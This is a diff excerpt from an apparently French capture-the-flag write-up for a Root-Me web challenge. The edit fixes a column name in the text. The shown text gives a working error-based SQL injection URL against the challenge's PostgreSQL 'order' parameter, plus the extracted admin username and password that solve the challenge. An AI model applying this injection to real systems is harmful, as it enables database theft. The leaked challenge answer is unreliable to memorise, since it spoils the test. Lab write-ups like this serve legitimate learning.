@@ -32,7 +32,7 @@ http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC%20LIM
 
 column_name va retourner le nom de la colonne dans l'erreur xml, il suffit juste de changer ordinal_position qui indique la position de la colonne recherché. 1 contient id, 2 contient us3rn4m3_c0l et 3 contient p455w0rd_c0l. Nous avons ainsi maintenant le nom de chaque colonne de la table.
 
-Il suffit maintenant de faire un select sur la colonne 20p455w0rd_c0l dans la table 20m3mbr35t4bl3 afin de récupérer le mot de passe de l'administrateur:  http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC%20LIMIT%20(select%20CAST(xmlparse(DOCUMENT%20p455w0rd_c0l)::text%20AS%20INTEGER)x%20from%20m3mbr35t4bl3)
+Il suffit maintenant de faire un select sur la colonne p455w0rd_c0l dans la table 20m3mbr35t4bl3 afin de récupérer le mot de passe de l'administrateur:  http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC%20LIMIT%20(select%20CAST(xmlparse(DOCUMENT%20p455w0rd_c0l)::text%20AS%20INTEGER)x%20from%20m3mbr35t4bl3)
 on obtient 1a2BdKT5DIx3qxQN3UaC . On fait la même chose avec us3rn4m3_c0l afin d'obtenir le pseudo de l'administrateur, admin. On peut enfin se connecter à la page login via ces identifiants et ainsi finir le challenge.
 
 
